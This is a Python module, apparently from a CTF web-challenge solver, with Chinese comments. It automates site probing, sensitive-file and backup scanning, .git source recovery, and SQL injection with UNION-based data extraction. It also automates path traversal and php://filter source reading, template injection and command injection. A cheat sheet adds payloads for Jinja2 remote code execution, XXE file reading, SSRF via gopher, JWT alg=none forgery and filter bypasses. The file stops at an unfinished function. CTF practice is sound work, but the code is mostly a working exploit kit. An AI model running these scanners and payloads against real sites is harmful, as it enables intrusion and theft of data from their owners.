"""Web 题目自动化：信息探测、敏感文件/备份扫描、.git 泄露恢复、SQL 注入、LFI、SSTI、命令注入、请求重放。"""

from __future__ import annotations

import base64
import gzip
import hashlib
import http.client
import io
import os
import re
import ssl
import time
import urllib.parse
import zlib
from dataclasses import dataclass, field

from .flags import find_flags

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"


@dataclass
class Resp:
    status: int = 0
    headers: dict = field(default_factory=dict)
    body: bytes = b""
    url: str = ""
    elapsed: float = 0.0
    error: str = ""

    @property
    def text(self) -> str:
        for enc in ("utf-8", "gbk", "latin-1"):
            try:
                return self.body.decode(enc)
            except UnicodeDecodeError:
                continue
        return self.body.decode("utf-8", "ignore")

    def header(self, name: str, default: str = "") -> str:
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default


def http_request(url: str, method: str = "GET", params: dict | None = None, body: bytes | None = None,
                 headers: dict | None = None, timeout: float = 10.0, allow_redirects: bool = False,
                 max_redirects: int = 5, verify: bool = False) -> Resp:
    """轻量 HTTP 客户端：可控重定向、可忽略证书、记录耗时。"""
    if params:
        url = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
    current = url
    started = time.time()
    for _ in range(max_redirects + 1):
        parts = urllib.parse.urlsplit(current)
        host = parts.hostname or ""
        port = parts.port or (443 if parts.scheme == "https" else 80)
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        hdrs = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
        hdrs.update(headers or {})
        try:
            if parts.scheme == "https":
                ctx = ssl.create_default_context()
                if not verify:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request(method, path, body=body, headers=hdrs)
            raw = conn.getresponse()
            data = raw.read()
            if raw.getheader("Content-Encoding", "").lower() == "gzip":
                try:
                    data = gzip.decompress(data)
                except OSError:
                    pass
            resp = Resp(raw.status, {k: v for k, v in raw.getheaders()}, data, current,
                        time.time() - started)
            conn.close()
            if allow_redirects and raw.status in (301, 302, 303, 307, 308):
                loc = resp.header("Location")
                if loc:
                    current = urllib.parse.urljoin(current, loc)
                    if raw.status == 303:
                        method, body = "GET", None
                    continue
            return resp
        except Exception as exc:  # noqa: BLE001
            return Resp(0, {}, b"", current, time.time() - started, str(exc))
    return Resp(0, {}, b"", current, time.time() - started, "重定向次数过多")


def normalize_url(raw: str) -> str:
    raw = raw.strip().strip('"\'')
    if not raw:
        return ""
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    return raw


# --------------------------------------------------------------------------- #
# ① 站点信息探测
# --------------------------------------------------------------------------- #
INTEREST_HEADERS = ("server", "x-powered-by", "set-cookie", "x-flag", "flag", "location",
                    "content-type", "x-debug", "x-backend", "via", "x-real-ip",
                    "strict-transport-security", "content-security-policy")


def probe_site(url: str, timeout: float = 10.0) -> tuple[list[str], list[str], Resp]:
    """基础信息探测：标题、关键响应头、Cookie、源码注释与 flag 线索。"""
    lines: list[str] = []
    flags: list[str] = []
    resp = http_request(url, allow_redirects=True, timeout=timeout)
    if resp.error:
        return [f"[!] 请求失败：{resp.error}"], [], resp
    lines.append(f"状态码：{resp.status}   最终地址：{resp.url}   耗时：{resp.elapsed:.2f}s")
    lines.append(f"页面大小：{len(resp.body)} 字节")
    for h in INTEREST_HEADERS:
        v = resp.header(h)
        if v:
            mark = "★ " if re.search(r"flag|ctf\{", v, re.I) else ""
            lines.append(f"{mark}响应头 {h}: {v[:200]}")
            flags += [x.value for x in find_flags(v)]
    title = re.search(r"<title[^>]*>(.*?)</title>", resp.text, re.I | re.S)
    if title:
        lines.append(f"页面标题：{title.group(1).strip()[:120]}")
    # 注释
    comments = re.findall(r"<!--(.*?)-->", resp.text, re.S)[:20]
    if comments:
        lines.append("\nHTML 注释：")
        for c in comments:
            c = c.strip()[:200]
            if c:
                lines.append(f"  · {c}")
                flags += [x.value for x in find_flags(c)]
    # 表单 / 参数
    forms = re.findall(r"<form[^>]*action=[\"']?([^\"'>\s]*)", resp.text, re.I)[:10]
    inputs = re.findall(r"<input[^>]*name=[\"']([^\"']+)", resp.text, re.I)[:20]
    if forms or inputs:
        lines.append(f"\n表单动作：{forms or '（当前页）'}")
        lines.append(f"输入参数：{inputs}")
    links = sorted({m for m in re.findall(r"(?:href|src)=[\"']([^\"'#?]+)", resp.text)})
    if links:
        lines.append(f"\n页面引用的资源/链接（{len(links)} 个，前 15 个）：")
        for l in links[:15]:
            lines.append(f"  {l[:120]}")
    # 全部正文里的 flag
    flags += [x.value for x in find_flags(resp.text)]
    # 安全头检查
    missing = [h for h in ("Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options")
               if not resp.header(h)]
    if missing:
        lines.append(f"\n缺少的安全响应头（题目里常作为线索）：{', '.join(missing)}")
    return lines, sorted(set(flags)), resp


# --------------------------------------------------------------------------- #
# ② 敏感文件 / 备份文件扫描
# --------------------------------------------------------------------------- #
SENSITIVE_PATHS = [
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".svn/entries", ".DS_Store",
    ".env", ".htaccess", "flag", "flag.txt", "flag.php", "f1ag.txt", "FLAG.txt",
    "www.zip", "web.zip", "backup.zip", "wwwroot.zip", "source.zip", "src.zip", "www.tar.gz",
    "phpinfo.php", "info.php", "test.php", "shell.php", "admin/", "login.php",
    "index.php.bak", "index.php~", "index.php.swp", "index.php.save", "index.php.old",
    "index.php.txt", "index.php.zip", "index.php.gz", "index.php.bak.php",
    "index.phps", "index.php.orig", "index.php.copy", "index.php1",
    "app.py", "main.py", "app.js", "source.js", "config.php", "config.php.bak",
    "database.sql", "db.sql", "dump.sql", "1.sql", "composer.json", "package.json",
    "Dockerfile", "docker-compose.yml", "README.md", ".gitignore",
]


def scan_sensitive(base_url: str, extra_paths: list[str] | None = None,
                   timeout: float = 8.0, on_progress=None) -> tuple[list[str], list[str]]:
    """扫描常见敏感文件 / 备份文件；.git 泄露会给出恢复入口。"""
    base = base_url.rstrip("/")
    paths = list(SENSITIVE_PATHS)
    # 先看 robots.txt，它经常直接点名隐藏路径
    robots = http_request(f"{base}/robots.txt", timeout=timeout)
    if robots.status == 200 and robots.body:
        hinted = re.findall(r"(?im)^\s*(?:dis)?allow\s*:\s*(\S+)", robots.text)
        hinted = [h.lstrip("/") for h in hinted if h and h != "/"]
        if hinted:
            paths = hinted + paths
    paths = list(dict.fromkeys(paths + (extra_paths or [])))
    lines: list[str] = []
    flags: list[str] = []
    hits = 0
    for i, p in enumerate(paths):
        if on_progress and i % 8 == 0:
            on_progress(f"扫描 {i+1}/{len(paths)}：{p}")
        resp = http_request(f"{base}/{p}", timeout=timeout)
        if resp.error or resp.status == 0:
            continue
        if resp.status == 404 or (resp.status == 200 and len(resp.body) == 0):
            continue
        size = len(resp.body)
        note = ""
        found = find_flags(resp.text[:20000]) if size < 2 * 1024 * 1024 else []
        if found:
            note = "  ★ flag：" + ", ".join(x.value for x in found[:3])
            flags += [x.value for x in found]
        if "index.php." in p or p.endswith((".bak", ".zip", ".gz", "~", ".swp")) and size > 100:
            note += "  ← 源码泄露，建议下载查看"
        lines.append(f"[{resp.status}] /{p}   {size} 字节{note}")
        hits += 1
        if p == ".git/HEAD" and resp.status == 200 and b"ref:" in resp.body:
            lines.append("      ★ 发现 .git 泄露！用「.git 源码泄露恢复」卡片可以把整个源码仓库拉回来")
    if not lines:
        lines.append("没有扫到常见敏感文件（可以再试自定义字典，或换个路径）")
    return lines, sorted(set(flags))


# --------------------------------------------------------------------------- #
# ③ .git 源码泄露恢复
# --------------------------------------------------------------------------- #
def _git_get(base: str, path: str, timeout: float = 10.0) -> bytes | None:
    resp = http_request(base.rstrip("/") + "/.git/" + path.lstrip("/"), timeout=timeout)
    if resp.status == 200 and resp.body:
        return resp.body
    return None


def git_dump(base_url: str, outdir: str, timeout: float = 10.0,
             max_objects: int = 400, on_progress=None) -> tuple[list[str], list[str]]:
    """从 .git 泄露恢复源码（松对象版本，等价于 ctf-git / GitHack 的常见流程）。"""
    lines: list[str] = []
    flags: list[str] = []
    head = _git_get(base_url, "HEAD", timeout)
    if not head:
        return ["没有读到 .git/HEAD（可能不是 git 泄露，或路径不同）"], []
    ref = head.decode("utf-8", "ignore").strip()
    lines.append(f"HEAD: {ref}")
    sha = None
    if ref.startswith("ref:"):
        ref_path = ref.split(":", 1)[1].strip()
        data = _git_get(base_url, ref_path, timeout)
        if data:
            sha = data.decode().strip()
        else:
            packed = _git_get(base_url, "packed-refs", timeout)
            if packed:
                for ln in packed.decode("utf-8", "ignore").splitlines():
                    if ln.strip().endswith(ref_path):
                        sha = ln.split()[0]
                        break
    else:
        sha = ref
    if not sha or not re.fullmatch(r"[0-9a-f]{40}", sha):
        return lines + ["解析不到 commit 哈希（可能是 pack 打包对象，暂不支持）"], []
    lines.append(f"最新 commit: {sha}")

    seen: set[str] = set()
    blobs: dict[str, bytes] = {}
    paths: dict[str, str] = {}
    queue: list[tuple[str, str]] = [(sha, "")]
    count = 0
    missing = 0
    while queue and count < max_objects:
        obj_sha, path = queue.pop(0)
        if obj_sha in seen:
            continue
        seen.add(obj_sha)
        count += 1
        if on_progress and count % 10 == 0:
            on_progress(f"已拉取 {count} 个对象，当前 {path or '.'}")
        raw = _git_get(base_url, f"objects/{obj_sha[:2]}/{obj_sha[2:]}", timeout)
        if not raw:
            missing += 1
            continue
        try:
            data = zlib.decompress(raw)
        except zlib.error:
            continue
        nul = data.find(b"\x00")
        if nul < 0:
            continue
        header = data[:nul].decode("latin-1")
        body = data[nul + 1:]
        kind = header.split()[0]
        if kind == "commit":
            for m in re.finditer(rb"(?:tree|parent) ([0-9a-f]{40})", body):
                queue.append((m.group(1).decode(), ""))
        elif kind == "tree":
            pos = 0
            while pos < len(body):
                sp = body.find(b" ", pos)
                if sp < 0:
                    break
                mode = body[pos:sp].decode("latin-1")
                nul2 = body.find(b"\x00", sp)
                if nul2 < 0:
                    break
                name = body[sp + 1:nul2].decode("utf-8", "replace")
                child = body[nul2 + 1:nul2 + 21].hex()
                pos = nul2 + 21
                full = f"{path}/{name}" if path else name
                if mode.startswith("40000") or mode.startswith("160000"):
                    queue.append((child, full))
                else:
                    paths[child] = full
                    queue.append((child, full))
        elif kind == "blob":
            blobs[obj_sha] = body

    try:
        os.makedirs(outdir, exist_ok=True)
    except OSError:
        import tempfile
        outdir = os.path.join(tempfile.gettempdir(), "ctf_git_dump")
        os.makedirs(outdir, exist_ok=True)
        lines.append(f"（默认目录不可写，已改用：{outdir}）")
    saved = 0
    hit_lines: list[str] = []
    for obj_sha, content in blobs.items():
        if len(content) > 4 * 1024 * 1024:
            continue
        rel = paths.get(obj_sha) or obj_sha
        target = os.path.join(outdir, *rel.split("/"))
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as fh:
                fh.write(content)
            saved += 1
        except OSError:
            continue
        found = find_flags(content.decode("utf-8", "ignore")[:20000])
        if found:
            flags += [x.value for x in found]
            hit_lines.append(f"★ {rel}: " + ", ".join(x.value for x in found[:2]))
    lines.append(f"解析对象 {count} 个（缺失 {missing}），恢复文件 {saved} 份")
    if hit_lines:
        lines.append("命中 flag 的文件：")
        lines += ["  " + t for t in hit_lines[:20]]
    lines.append(f"源码已恢复到：{outdir}")
    return lines, sorted(set(flags))


# --------------------------------------------------------------------------- #
# ④ SQL 注入
# --------------------------------------------------------------------------- #
SQL_ERRORS = [
    r"SQL syntax.*?MySQL", r"Warning.{0,20}mysqli?", r"Unclosed quotation mark",
    r"quoted string not properly terminated", r"PostgreSQL.{0,40}ERROR", r"pg_query\(\)",
    r"SQLite/JDBCDriver", r"sqlite3\.OperationalError", r"SQLSTATE\[", r"ORA-\d{5}",
    r"Microsoft OLE DB Provider for SQL Server", r"syntax error at or near",
    r"check the manual that (corresponds|fits) to your (MySQL|MariaDB)",
    r"Unknown column", r"You have an error in your SQL syntax",
]


def _inject_params(url: str, param: str, value: str) -> str:
    q = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qs(q.query, keep_blank_values=True)
    if param in query:
        query[param] = [value]
    else:
        query[param] = [value]
    new_q = urllib.parse.urlencode({k: v[0] for k, v in query.items()})
    return urllib.parse.urlunsplit((q.scheme, q.netloc, q.path, new_q, q.fragment))


def _sig(resp: Resp) -> str:
    return hashlib.md5(resp.body).hexdigest() + f":{len(resp.body)}"


def sqli_scan(url: str, param: str, timeout: float = 10.0,
              on_progress=None) -> tuple[list[str], list[str]]:
    """SQL 注入自动检测：报错型 / 布尔盲注 / 时间盲注 / 联合查询取数。"""
    lines: list[str] = []
    flags: list[str] = []

    def send(value: str) -> Resp:
        return http_request(_inject_params(url, param, value), timeout=timeout)

    baseline = send("1")
    if baseline.error:
        return [f"[!] 请求失败：{baseline.error}"], []
    lines.append(f"基准响应：状态 {baseline.status}，{len(baseline.body)} 字节")

    # 报错型
    error_found = ""
    for payload in ("'", "\"", "')", "' AND '1'='1", "1'", "\\"):
        if on_progress:
            on_progress(f"报错探测：{payload}")
        r = send(payload)
        for pat in SQL_ERRORS:
            m = re.search(pat, r.text, re.I)
            if m:
                error_found = f"payload {payload!r} → {m.group(0)[:80]}"
                break
        if error_found:
            break
    if error_found:
        lines.append(f"★ 报错型注入：{error_found}")
    else:
        lines.append("报错型：未触发数据库报错")

    # 布尔盲注
    t1 = send("1 AND 1=1")
    f1 = send("1 AND 1=2")
    t2 = send("1' AND '1'='1")
    f2 = send("1' AND '1'='2")
    bool_hit = ""
    if _sig(t1) != _sig(f1) and t1.status == f1.status:
        bool_hit = "数字型（1 AND 1=1 / 1 AND 1=2 响应不同）"
    elif _sig(t2) != _sig(f2) and t2.status == f2.status:
        bool_hit = "字符型（1' AND '1'='1 / '1'='2 响应不同）"
    lines.append(f"{'★ 布尔盲注：' + bool_hit if bool_hit else '布尔盲注：真假响应一致，未发现'}")

    # 时间盲注
    time_hit = ""
    for payload, marker in (("1' AND SLEEP(3)-- -", "MySQL"), ("1 AND SLEEP(3)", "MySQL/无引号"),
                            ("1';SELECT pg_sleep(3)-- -", "PostgreSQL"),
                            ("1' WAITFOR DELAY '0:0:3'-- -", "SQL Server"),
                            ("1' AND 1=randomblob(300000000)-- -", "SQLite")):
        if on_progress:
            on_progress(f"时间盲注探测（{marker}）…")
        t0 = time.time()
        send(payload)
        dt = time.time() - t0
        if dt >= 2.6:
            time_hit = f"{marker}（延迟 {dt:.1f}s）"
            break
    lines.append(f"{'★ 时间盲注：' + time_hit if time_hit else '时间盲注：未观察到明显延迟'}")

    if not (error_found or bool_hit or time_hit):
        lines.append("\n结论：这个参数上没检测到注入。可以试试其它参数、或换成 POST 请求。")
        return lines, []

    # 联合查询：先猜列数
    lines.append("\n== 尝试联合查询取数 ==")
    cols = 0
    ctx: tuple[str, str] | None = None
    visible_col = None
    for pre, suf in (("", " "), ("'", "-- -"), ('"', "-- -"), ("')", "-- -"), ("", "-- -")):
        c = 0
        for n in range(1, 11):
            r = send(f"1{pre} ORDER BY {n}{suf}")
            if re.search("|".join(SQL_ERRORS), r.text, re.I) or r.status >= 500:
                c = n - 1
                break
            c = n
        if c <= 0:
            continue
        for n in range(c):
            # 用纯数字标记：MySQL/PG/SQLite 都能原样回显（0x... 在 SQLite 里会被当整数）
            parts = ["1337071338" if i == n else "1" for i in range(c)]
            payload = f"1{pre} UNION SELECT " + ", ".join(parts) + suf
            r = send(payload)
            if "1337071338" in r.text:
                ctx, cols, visible_col = (pre, suf), c, n
                break
        if ctx:
            break
    if not ctx or visible_col is None:
        lines.append("列数/回显列探测失败，跳过联合查询（可改用请求重放器手工调）")
        return lines, flags
    lines.append(f"注入上下文：{ctx[0]!r} … {ctx[1]!r}   推测列数：{cols}   回显列：第 {visible_col+1} 列")
    extract_exprs = [
        ("当前数据库", "database()"),
        ("数据库版本", "version()"),
        ("SQLite 表名列表", "SELECT group_concat(name) FROM sqlite_master WHERE type='table'"),
        ("MySQL/PG 表名列表", "SELECT group_concat(table_name) FROM information_schema.tables"),
        ("flag 表(secret 列)", "SELECT group_concat(secret) FROM flag"),
        ("flag 表(flag 列)", "SELECT group_concat(flag) FROM flag"),
        ("flag 表(value 列)", "SELECT group_concat(value) FROM flag"),
        ("flag 表(name 列)", "SELECT group_concat(name) FROM flag"),
    ]
    for label, expr in extract_exprs:
        parts = [f"({expr})" if i == visible_col else "1" for i in range(cols)]
        payload = f"1{ctx[0]} UNION SELECT " + ", ".join(parts) + ctx[1]
        r = send(payload)
        hits = find_flags(r.text)
        if hits:
            flags += [h.value for h in hits]
            lines.append(f"★ {label} 直接取到 flag：{hits[0].value}")
            return lines, sorted(set(flags))
        snippet = re.sub(r"<[^>]+>", " ", r.text)
        snippet = re.sub(r"\s+", " ", snippet).strip()[:120]
        lines.append(f"{label}：{snippet or '（无回显）'}")
    lines.append("\n提示：如果回显位置/列数特殊，可以在“高级工具面板 → 其他技巧”里用请求重放器手工微调 payload。")
    return lines, sorted(set(flags))


# --------------------------------------------------------------------------- #
# ⑤ 文件包含 / 路径穿越
# --------------------------------------------------------------------------- #
LFI_TARGETS = ["/etc/passwd", "/flag", "/flag.txt", "/proc/self/environ", "index.php",
               "../flag", "../../flag", "../../../flag"]


def lfi_scan(url: str, param: str, timeout: float = 10.0,
             on_progress=None) -> tuple[list[str], list[str]]:
    lines: list[str] = []
    flags: list[str] = []
    base_resp = http_request(_inject_params(url, param, "index.php"), timeout=timeout)
    lines.append(f"基准响应：状态 {base_resp.status}，{len(base_resp.body)} 字节")
    targets = ["etc/passwd", "flag", "flag.txt", "tmp/flag", "var/www/html/flag"]
    for target in targets:
        for depth in range(0, 8):
            payload = "../" * depth + target
            if on_progress:
                on_progress(f"测试 {payload}")
            r = http_request(_inject_params(url, param, payload), timeout=timeout)
            if r.error:
                continue
            body = r.text
            if "/etc/passwd" in target and re.search(r"root:.*:0:0:", body):
                lines.append(f"★ 路径穿越成功：{param}={payload}（成功读到 /etc/passwd）")
                lines.extend("    " + l for l in body.splitlines()[:6])
                flags += [h.value for h in find_flags(body)]
                return lines, sorted(set(flags))
            hits = find_flags(body)
            if hits:
                lines.append(f"★ {param}={payload} 页面出现 flag：{', '.join(h.value for h in hits[:3])}")
                flags += [h.value for h in hits]
                return lines, sorted(set(flags))
    # php://filter 读源码
    for f in ("index.php", "flag.php", "config.php"):
        payload = f"php://filter/convert.base64-encode/resource={f}"
        r = http_request(_inject_params(url, param, payload), timeout=timeout)
        m = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", r.text)
        if m:
            try:
                src = base64.b64decode(m.group(0) + "==").decode("utf-8", "ignore")
            except Exception:
                continue
            if "<?php" in src or "flag" in src.lower():
                lines.append(f"★ php://filter 读到 {f} 源码（{len(src)} 字节）")
                lines.extend("    " + l for l in src.splitlines()[:25])
                flags += [h.value for h in find_flags(src)]
                return lines, sorted(set(flags))
    lines.append("常见的路径穿越 / php://filter 都没成功（可能参数名不对，或做了过滤）")
    return lines, sorted(set(flags))


# --------------------------------------------------------------------------- #
# ⑥ SSTI / 命令注入
# --------------------------------------------------------------------------- #
SSTI_PAYLOADS = [
    ("Jinja2/Twig", "{{7*7}}", "49"),
    ("Jinja2 变体", "{{7*'7'}}", "7777777"),
    ("Go text/template", "{{ . }}", "."),
    ("Go text/template(计算)", "{{ len \"abcd\" }}", "4"),
    ("Freemarker", "${7*7}", "49"),
    ("Velocity", "#set($x=7*7)$x", "49"),
    ("Smarty", "{7*7}", "49"),
    ("ERB", "<%= 7*7 %>", "49"),
    ("Thymeleaf", "[[${7*7}]]", "49"),
    ("Ruby", "#{7*7}", "49"),
]


def crawl_and_audit_js(base_url: str, timeout: float = 10.0,
                       max_js: int = 12, on_progress=None) -> tuple[list[str], list[str]]:
    """抓首页 → 找出所有 JS → 逐个下载审计（babyWeb 那类“flag 在前端 JS 里”）。"""
    from .flags import find_flags
    lines: list[str] = []
    flags: list[str] = []
    resp = http_request(base_url, allow_redirects=True, timeout=timeout)
    if resp.error:
        return [f"[!] 首页请求失败：{resp.error}"], []
    html = resp.text
    lines.append(f"首页 {resp.status}，{len(resp.body)} 字节")
    js_urls = re.findall(r"""<script[^>]+src=["']([^"']+)["']""", html, re.I)
    inline = re.findall(r"<script[^>]*>(.*?)</script>", html, re.S | re.I)
    lines.append(f"外链 JS {len(js_urls)} 个，内联脚本 {len(inline)} 段")
    # 先审内联
    for i, code in enumerate(inline):
        hits = [h.value for h in find_flags(code) if h.score >= 40]
        if hits:
            lines.append(f"★ 内联脚本里发现 flag：{hits[0]}")
            flags += hits
        if re.search(r"(flag|key|secret|token)", code, re.I) and len(code) < 20000:
            snip = re.search(r".{0,60}(flag|key|secret|token).{0,80}", code, re.I | re.S)
            if snip:
                lines.append("  内联脚本可疑片段：" + snip.group(0).replace("\n", " ")[:160])
    # 再逐个下 JS
    for i, src in enumerate(dict.fromkeys(js_urls)):
        if i >= max_js:
            break
        url = urllib.parse.urljoin(resp.url, src)
        if on_progress:
            on_progress(f"审计 JS：{url}")
        js = http_request(url, timeout=timeout)
        if js.error or js.status != 200:
            continue
        code = js.text
        lines.append(f"\n[{js.status}] {src}  ({len(js.body)} 字节)")
        hits = [h.value for h in find_flags(code) if h.score >= 40]
        if hits:
            lines.append(f"  ★ 发现 flag：{hits[0]}")
            flags += hits
        for m in re.finditer(r"[^\n]{0,80}(flag|key|secret|token|password)[^\n]{0,120}", code, re.I):
            seg = m.group(0).strip()
            if len(seg) > 8 and "function" not in seg[:12]:
                lines.append("  可疑：" + seg[:200])
                flags += [h.value for h in find_flags(seg) if h.score >= 40]
    if not flags:
        lines.append("\n没有直接找到 flag。提示：2048 那类游戏题，flag 常在 "
                     "html_actuator.js 之类的前端逻辑里（搜索 win/胜利分支），"
                     "或者搜 flag/0x 开头的常量。")
    return lines, sorted(set(flags))


def ssti_scan(url: str, param: str, timeout: float = 10.0,
              on_progress=None) -> tuple[list[str], list[str]]:
    lines: list[str] = []
    flags: list[str] = []
    for name, payload, expect in SSTI_PAYLOADS:
        if on_progress:
            on_progress(f"SSTI 测试 {name}")
        r = http_request(_inject_params(url, param, payload), timeout=timeout)
        if r.error:
            continue
        if expect in r.text and payload not in r.text:
            lines.append(f"★ SSTI 命中：{name}（payload {payload!r} 回显 {expect}）")
            flags += [h.value for h in find_flags(r.text)]
            lines.append("  进一步可以用类似 {{config}} / {{ ''.__class__.__mro__ }} 读取配置或命令执行")
            return lines, sorted(set(flags))
    lines.append("没有检测到模板注入（模板引擎可能做了过滤，或参数不对）")
    return lines, []


RCE_PAYLOADS = [
    (";id", r"uid=\d+"), ("|id", r"uid=\d+"), ("$(id)", r"uid=\d+"), ("`id`", r"uid=\d+"),
    ("&&id", r"uid=\d+"), ("%0aid", r"uid=\d+"),
    (";whoami", r"\b(root|www-data|nobody|apache|nginx)\b"),
    ("|cat /flag", r"flag\{"),
    (";cat /flag*", r"flag\{"),
]


def rce_scan(url: str, param: str, timeout: float = 10.0,
             on_progress=None) -> tuple[list[str], list[str]]:
    lines: list[str] = []
    flags: list[str] = []
    for payload, pattern in RCE_PAYLOADS:
        if on_progress:
            on_progress(f"命令注入测试 {payload!r}")
        r = http_request(_inject_params(url, param, payload), timeout=timeout)
        if r.error:
            continue
        m = re.search(pattern, r.text)
        if m:
            lines.append(f"★ 命令注入命中：{param}={payload!r} → {m.group(0)[:120]}")
            hits = find_flags(r.text)
            flags += [h.value for h in hits]
            if hits:
                lines.append("   页面直接出现 flag！")
                return lines, sorted(set(flags))
    if not lines:
        lines.append("没有检测到命令注入（可能被过滤，或参数/方法不对）")
    return lines, sorted(set(flags))


# --------------------------------------------------------------------------- #
# ⑦ 请求重放器 / 源码审计
# --------------------------------------------------------------------------- #
def replay_request(raw: str, timeout: float = 15.0, allow_redirects: bool = False) -> Resp:
    """重放原始 HTTP 请求（Burp 里复制出来的那种）。"""
    raw = raw.replace("\r\n", "\n").strip("\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    if not lines:
        return Resp(error="空请求")
    method, _, rest = lines[0].partition(" ")
    path = rest.strip()
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            headers[k.strip()] = v.strip()
    host = headers.pop("Host", headers.pop("host", ""))
    scheme = "https" if "https" in path.lower() else "http"
    if path.startswith("http"):
        url = path
    else:
        url = f"{scheme}://{host}{path}"
    body_b = body.encode("utf-8", "ignore") if body else None
    return http_request(url, method=method.strip() or "GET", body=body_b, headers=headers,
                        timeout=timeout, allow_redirects=allow_redirects)


SECRET_PATTERNS = [
    (r"(?:api[_-]?key|apikey|secret|token|passwd|password)\s*[:=]\s*[\"']([^\"']{6,})", "疑似密钥/口令"),
    (r"AKIA[0-9A-Z]{16}", "AWS AccessKey"),
    (r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}", "JWT"),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "私钥"),
    (r"(?:Authorization|Bearer)\s+[A-Za-z0-9_\-\.]{12,}", "认证头"),
]


def audit_source(text: str) -> tuple[list[str], list[str]]:
    """审计 HTML / JS / 源码：注释、接口、密钥、隐藏字段、flag。"""
    lines: list[str] = []
    flags: list[str] = []
    comments = re.findall(r"<!--(.*?)-->", text, re.S) + re.findall(r"//[^\n]{4,120}", text)
    if comments:
        lines.append(f"注释 {len(comments)} 条：")
        for c in comments[:25]:
            c = c.strip()
            if c:
                lines.append("  · " + c[:160])
                flags += [h.value for h in find_flags(c)]
    endpoints = sorted(set(re.findall(r"[\"'](/[A-Za-z0-9_\-/\.]{2,60})[\"']", text)))
    if endpoints:
        lines.append("\n接口 / 路径（可能藏着没暴露的接口）：")
        lines += ["  " + e for e in endpoints[:30]]
        flags += [h.value for e in endpoints for h in find_flags(e)]
    for pat, label in SECRET_PATTERNS:
        for m in re.finditer(pat, text, re.I):
            lines.append(f"\n★ {label}：{m.group(0)[:160]}")
            flags += [h.value for h in find_flags(m.group(0))]
    hidden = re.findall(r"<input[^>]*type=[\"']hidden[\"'][^>]*>", text, re.I)
    if hidden:
        lines.append("\n隐藏表单字段：")
        lines += ["  " + h[:200] for h in hidden[:10]]
        flags += [h.value for h in find_flags(" ".join(hidden))]
    js_files = re.findall(r"src=[\"']([^\"']+\.js[^\"']*)", text, re.I)
    if js_files:
        lines.append("\n引用的 JS 文件（建议逐个下载审一遍）：")
        lines += ["  " + j for j in sorted(set(js_files))[:15]]
    flags += [h.value for h in find_flags(text)]
    return lines, sorted(set(flags))


WEB_CHEATSHEET = """【SQL 注入】
· 判断：' 报错 / 1 AND 1=1 vs 1=2 响应差异 / SLEEP(3) 延迟
· 列数：' ORDER BY 3-- - 递增到报错；' UNION SELECT 1,2,3-- -
· 取数：' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
· 无回显：布尔盲注 substr((select ...),1,1)>'m' / 时间盲注 AND IF(cond,SLEEP(3),0)
· 常见绕过：空格→/**/ 或 %09、注释→ -- - / # / %23、关键字→大小写混写/双写

【文件包含 LFI】
· ?file=../../../../etc/passwd
· php://filter/convert.base64-encode/resource=index.php   （读源码）
· php://filter/read=string.rot13/resource=index.php
· data://text/plain;base64,PD9waHAg...                  （配合文件包含 RCE）
· /proc/self/environ、日志包含、session 文件包含

【SSTI 模板注入】
· {{7*7}} → 49：Jinja2/Twig；${7*7}：Freemarker；#{7*7}：Ruby；<%= 7*7 %>：ERB
· Jinja2 利用：{{config}} / {{''.__class__.__mro__[1].__subclasses__()}}
  / {{ cycler.__init__.__globals__.os.popen('id').read() }}

【命令注入】
· ;id   |id   `id`   $(id)   %0aid   &&id   ||id
· 空格过滤：${IFS} / $IFS$9 / %09 / 重定向 <
· 关键字过滤：c\\at / ca""t / /bin/c?t / 变量拼接

【XXE】
· <?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///flag">]><x>&f;</x>
· 无回显：外带 OOB，或 blind XXE + 参数实体

【SSRF】
· file:///flag、dict://、gopher://（打内网 Redis/MySQL）
· 常见绕过：127.0.0.1 → 2130706433 / 0x7f000001 / 127.1 / [::1]
· 内网探测：http://127.0.0.1:80 等端口

【文件上传绕过】
· 后缀：php3/php4/php5/phtml/pht/phar、大小写 Php、%00 截断（老版本）
· 内容：GIF89a 头伪装、.htaccess 上传、Content-Type 修改

【JWT】
· alg 改成 none 并去掉签名；弱密钥爆破；kid 注入（路径穿越/命令）；
· jku/x5u 指向自己的 JWKS

【PHP 特性】
· 弱类型：0e 开头哈希相等（240610708、QNKCDZO）、"admin"==0
· 反序列化：__wakeup/__destruct、phar:// 触发
· 变量覆盖：extract()、parse_str()、$$var
"""


# --------------------------------------------------------------------------- #
# ⑧ 一键自动解题（Web）
# --------------------------------------------------------------------------- #
def guess_params(html: str, url: str) -> list[str]:
    """从页面表单/链接里猜出可能的参数名。"""
    names = re.findall(r"<input[^>]*name=[\"']([^\"'\]\s]+)", html, re.I)
    names += re.findall(r"[?&]([A-Za-z_][A-Za-z0-9_]{0,20})=", html)
    names += re.findall(r"[?&]([A-Za-z_][A-Za-z0-9_]{0,20})=", url)
    for k in ("id", "file", "name", "cmd", "url", "path", "page", "q", "search"):
        names.append(k)
    out, seen = [], set()
    for n in names:
        n = n.strip()
        if n and n.lower() not in seen and not n.startswith(("btn", "submit", "csrf", "token")):
            seen.add(n.lower())
            out.append(n)
    return out[:8]


def auto_solve(url: str, outdir: str = "", on_progress=None,
               time_budget: float = 180.0) -> dict:
